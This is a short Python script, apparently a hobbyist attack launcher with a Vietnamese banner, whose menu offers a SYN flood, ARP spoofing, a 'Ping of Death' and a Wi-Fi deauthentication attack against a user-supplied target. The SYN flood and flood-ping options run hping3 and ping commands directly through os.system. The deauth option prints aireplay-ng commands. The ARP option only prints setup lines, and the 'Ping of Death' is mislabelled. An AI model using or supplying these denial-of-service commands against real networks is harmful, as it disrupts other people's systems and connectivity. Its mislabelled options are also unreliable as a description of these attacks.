#!/usr/bin/env python3
import os
import sys
import subprocess

print("KHANG HỦY DIỆT LAYER 2")
print("=" * 40)

print("1. SYN Flood Attack")
print("2. ARP Spoofing")
print("3. Ping of Death")
print("4. Deauth Attack")
print("5. Exit")

choice = input("Lựa chọn: ")

if choice == "1":
    target = input("Target IP: ")
    os.system(f"hping3 -S --flood -V {target}")
elif choice == "2":
    print("Chạy: pip install scapy")
    print("Chạy: python -c \"from scapy.all import *\"")
elif choice == "3":
    target = input("Target IP: ")
    os.system(f"ping -s 65500 -f {target}")
elif choice == "4":
    print("Yêu cầu monitor mode")
    print("airmon-ng start wlan0")
    print("aireplay-ng --deauth 100 -a BSSID wlan0mon")
else:
    sys.exit()
